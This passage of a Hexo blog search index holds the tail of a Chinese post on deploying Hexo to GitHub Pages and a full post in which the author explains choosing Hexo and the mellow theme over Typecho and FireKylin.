hexo g
npm install hexo-deployer-git --save
hexo d</code></pre><h1 id="浏览"><a href="#浏览" class="headerlink" title="浏览"></a>浏览</h1><h2 id="github名称-github-io"><a href="#github名称-github-io" class="headerlink" title="github名称.github.io"></a>github名称.github.io</h2>]]></content>
      
        <categories>
            
            <category> 博客 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[为什么是Hexo?]]></title>
      <url>/2019/07/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AFHexo/</url>
      <content type="html"><![CDATA[<h2 id="关于Hexo"><a href="#关于Hexo" class="headerlink" title="关于Hexo"></a>关于Hexo</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
<h2 id="我为什么选择Hexo"><a href="#我为什么选择Hexo" class="headerlink" title="我为什么选择Hexo"></a>我为什么选择Hexo</h2><p>在选择Hexo之前我参考了Typecho和FireKylin，一开始我是打算搭建Typecho因为有后台方便管理，但是看到FireKylin后，一眼就喜欢行了就用阿里云搭建了FireKylin，FireKylin搭建还算顺利，但是最后还是放弃了！因为服务器也不打算长久买，备案挺麻烦，所以选择了Hexo托管在GitHub上面，这样还可以学习下github，于是我的Hexo就诞生。</p>
<h2 id="关于主题"><a href="#关于主题" class="headerlink" title="关于主题"></a>关于主题</h2><p>在Hexo搭建之前我就了解了NEXT主题挺多人用，于是试了一下，搭建好了配置过程百度看到了目前这款mellow便迷上了这款主题，最后还是选择mellow虽然没有NEXT那么出名，不过到目前为止还是觉得很实用</p>
<h2 id="布局调整"><a href="#布局调整" class="headerlink" title="布局调整"></a>布局调整</h2><p>虽然更换主题很快，但是修改各种信息参数还是花费了挺多时间。</p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>Waiting…..</p>
]]></content>
      
        <categories>
            
            <category> 博客 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
